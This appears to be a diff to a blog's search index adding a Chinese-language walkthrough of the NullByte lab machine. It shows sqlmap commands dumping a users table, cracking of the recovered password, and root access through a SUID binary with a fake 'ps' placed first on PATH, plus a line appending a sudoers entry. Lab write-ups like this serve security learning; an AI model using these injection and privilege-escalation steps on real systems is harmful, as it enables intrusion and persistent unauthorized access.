@@ -1,6 +1,170 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>nullbyte</title>
+    <url>/nullbyte/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#nullbyte-靶机渗透">NullByte 靶机渗透</a><ul>
+<li><a href="#0x01-环境信息">0x01 环境信息：</a></li>
+<li><a href="#0x02-渗透过程">0x02 渗透过程：</a></li>
+<li><a href="#0x03-the_end">0x03 THE_END</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="nullbyte-靶机渗透">NullByte 靶机渗透</span></h1><h2><span id="0x01-环境信息">0x01 环境信息：</span></h2><ol>
+<li><p>攻击机：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">system: kali linux Ipaddress: <span class="number">192.168</span><span class="number">.0</span><span class="number">.21</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>靶机：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">system: 未知 Ipaddress: 未知（局域网内）</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2><span id="0x02-渗透过程">0x02 渗透过程：</span></h2><ul>
+<li>主机发现</li>
+<li>使用初期扫描脚本扫描：</li>
+<li>扫描结果</li>
+</ul>
+<p><img data-src="../images/mdImages/image-20200512134810766.png" alt="image-20200512134810766"></p>
+<ul>
+<li><p>可以得到：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">iPaddress: <span class="number">192.168</span><span class="number">.0</span><span class="number">.113</span></span><br><span class="line">http: <span class="number">80</span>  /phpmyadmin</span><br><span class="line">rpcbind: <span class="number">111</span></span><br><span class="line">ssh: <span class="number">777</span></span><br><span class="line">system: Debian Linux</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>先去看看web</p>
+</li>
+<li><p><a href="http://192.168.0.113" target="_blank" rel="noopener">http://192.168.0.113</a></p>
+<p><img data-src="../images/mdImages/image-20200512135615706.png" alt="image-20200512135615706"></p>
+</li>
+<li><p>只有这么些东西，当然还有一个 <code>phpmyadmin</code> 也咩有密码啊</p>
+</li>
+<li><p>然后看看这个图片是不是有隐写</p>
+</li>
+<li><p>下载到kali里面</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">root@kali:~# exiftool main.gif</span><br><span class="line">ExifTool Version <span class="built_in">Number</span>         : <span class="number">11.98</span></span><br><span class="line">File Name                       : main.gif</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : <span class="number">16</span> kB</span><br><span class="line">File Modification <span class="built_in">Date</span>/Time     : <span class="number">2020</span>:<span class="number">05</span>:<span class="number">12</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">45</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access <span class="built_in">Date</span>/Time           : <span class="number">2020</span>:<span class="number">05</span>:<span class="number">12</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">45</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change <span class="built_in">Date</span>/Time     : <span class="number">2020</span>:<span class="number">05</span>:<span class="number">12</span> <span class="number">14</span>:<span class="number">35</span>:<span class="number">22</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : <span class="number">89</span>a</span><br><span class="line">Image Width                     : <span class="number">235</span></span><br><span class="line">Image Height                    : <span class="number">302</span></span><br><span class="line">Has Color <span class="built_in">Map</span>                   : No</span><br><span class="line">Color Resolution Depth          : <span class="number">8</span></span><br><span class="line">Bits Per Pixel                  : <span class="number">1</span></span><br><span class="line">Background Color                : <span class="number">0</span></span><br><span class="line">Comment                         : P-): kzMb5nVYJw</span><br><span class="line">Image Size                      : <span class="number">235</span>x302</span><br><span class="line">Megapixels                      : <span class="number">0.071</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到 <code>Comment        : P-): kzMb5nVYJw</code></p>
+</li>
+<li><p><code>kzMb5nVYJw</code> 好像是密码?还是什么</p>
+</li>
+<li><p>试了一下<code>phpmyadmin</code>的密码没用啊</p>
+</li>
+<li><p>然后我又爆破了一下目录</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512145546435.png" alt="image-20200512145546435"></p>
+</li>
+<li><p>没啥有用的信息啊</p>
+</li>
+<li><p>看看是不是这个目录</p>
+</li>
+<li><p><a href="http://192.168.0.113/kzMb5nVYJw" target="_blank" rel="noopener">http://192.168.0.113/kzMb5nVYJw</a></p>
+</li>
+<li><p>果然有，要我们输入key</p>
+</li>
+<li><p>试试SQL注入</p>
+</li>
+<li><p>先抓包</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512150308115.png" alt="image-20200512150308115"></p>
+</li>
+<li><p>再复制<code>copy to file</code> 保存为<code>sqlmap.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqlmap.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>不存在SQL注入</p>
+</li>
+<li><p>那只能尝试爆破了</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512151542526.png" alt="image-20200512151542526"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512151429648.png" alt="image-20200512151429648"></p>
+</li>
+<li><p>跑出来key是：<code>elite</code></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512151707333.png" alt="image-20200512151707333"></p>
+</li>
+<li><p>就看到搜索username的</p>
+</li>
+<li><p>再试试有没有sql注入</p>
+</li>
+<li><p>可以先用fuzz测试一下</p>
+</li>
+<li><p>抓个包</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512151959806.png" alt="image-20200512151959806"></p>
+</li>
+<li><p>然后<code>send to Intruder</code></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512152110694.png" alt="image-20200512152110694"></p>
+</li>
+<li><p>payload选<code>Fuzzing-SQL Injection</code>就可以</p>
+</li>
+<li><p>可以看到有些 会报sql语句的错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Could not get data: You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span>%;)(&amp;+%"' at line 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后就可以使用sqlmap跑了</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 --dbs</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] seth</span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 --current-db</span><br><span class="line">current database:    <span class="string">'seth'</span></span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth --tables</span><br><span class="line">Database: seth</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth -T users --columns</span><br><span class="line">Table: users</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| position | text        |</span><br><span class="line">| user     | text        |</span><br><span class="line">| id       | smallint(6) |</span><br><span class="line">| pass     | text        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth -T users -C user,pass --dump</span><br><span class="line">Database: seth</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------+---------------------------------------------+</span><br><span class="line">| user   | pass                                        |</span><br><span class="line">+--------+---------------------------------------------+</span><br><span class="line">| ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |</span><br><span class="line">| isis   | --not allowed--                             |</span><br><span class="line">+--------+---------------------------------------------+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以知道一个账号密码</p>
+</li>
+<li><p>是不是ssh的账号密码呢？</p>
+</li>
+<li><p>先把密码破解出来</p>
+</li>
+<li><p>好像是一串base64</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/workspace<span class="comment"># echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" &gt; b64</span></span><br><span class="line">root@kali:~/workspace<span class="comment"># base64 -d b64</span></span><br><span class="line">c6d6bd7ebf806f43c76acc3681703b81 base64: 输入无效</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>得到一串MD5 <code>c6d6bd7ebf806f43c76acc3681703b81</code></p>
+</li>
+<li><p>可以用john解密也可以到网上找</p>
+</li>
+<li><p>我用了下john没跑出来，用在线工具一下就出来了</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512154211755.png" alt="image-20200512154211755"></p>
+</li>
+<li><p>得到账号密码是：<code>ramses: omega</code></p>
+</li>
+<li><p>去试试ssh吧，记得端口是777</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512160325001.png" alt="image-20200512160325001"></p>
+</li>
+<li><p>就上了ssh了</p>
+</li>
+<li><p>想办法提权了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先试试这这几个</span></span><br><span class="line">sudo -l 	<span class="comment">#（无）</span></span><br><span class="line">crontab -l	<span class="comment">#（无）</span></span><br><span class="line"><span class="built_in">history</span>		<span class="comment">#（无可用的）</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/var/www/backup/procwatch</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到 <code>/var/www/backup/procwatch</code>文件为suid权限，先运行一下看看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1451 pts/0    00:00:00 procwatch</span><br><span class="line"> 1452 pts/0    00:00:00 sh</span><br><span class="line"> 1453 pts/0    00:00:00 ps</span><br><span class="line"> ramses@NullByte:/var/www/backup$ ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1361 pts/0    00:00:00 bash</span><br><span class="line"> 1454 pts/0    00:00:00 ps</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>好像就执行了一个ps</p>
+</li>
+<li><p>我们可以试试偷天换日</p>
+</li>
+<li><p>先伪造一个ps命令，并让他找到这个ps</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 伪造ps命令：</span></span><br><span class="line">echo <span class="string">'/bin/sh'</span> &gt; ps</span><br><span class="line">chmod +x ps</span><br><span class="line"><span class="comment">// 使procwatch找到这个ps:</span></span><br><span class="line"><span class="comment">// 先看看环境变量</span></span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ echo $PATH</span><br><span class="line">/usr/local/bin:<span class="regexp">/usr/</span>bin:<span class="regexp">/bin:/u</span>sr/local/games:<span class="regexp">/usr/g</span>ames</span><br><span class="line"><span class="comment">// 把当前文件夹的放到当前位置去，他就会先找当前目录下ps</span></span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ <span class="keyword">export</span> PATH=.:$PATH</span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ echo $PATH</span><br><span class="line">.:<span class="regexp">/usr/</span>local/bin:<span class="regexp">/usr/</span>bin:<span class="regexp">/bin:/u</span>sr/local/games:<span class="regexp">/usr/g</span>ames</span><br><span class="line"><span class="comment">// 执行procwatch</span></span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ ./procwatch</span><br><span class="line"># cd /root</span><br><span class="line"><span class="comment">//说明已经是root权限了</span></span><br><span class="line"># ls</span><br><span class="line">proof.txt</span><br><span class="line"><span class="comment">// 可以直接给ramses root权限</span></span><br><span class="line">echo <span class="string">'ramses	ALL=(ALL:ALL) ALL'</span> &gt;&gt; <span class="regexp">/etc/</span>sudoers</span><br><span class="line">exit</span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>就拿到了flag了~</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200512164547103.png" alt="image-20200512164547103"></p>
+</li>
+<li><p>看到第一条有个hash值，解密就是<code>welldone22</code></p>
+</li>
+</ul>
+<p><img data-src="../images/mdImages/image-20200512162730802.png" alt="image-20200512162730802"></p>
+<h2><span id="0x03-the_end">0x03 THE_END</span></h2><hr>
+]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker-Config</title>
     <url>/Docker-Config/</url>
     <content><![CDATA[<!-- toc -->
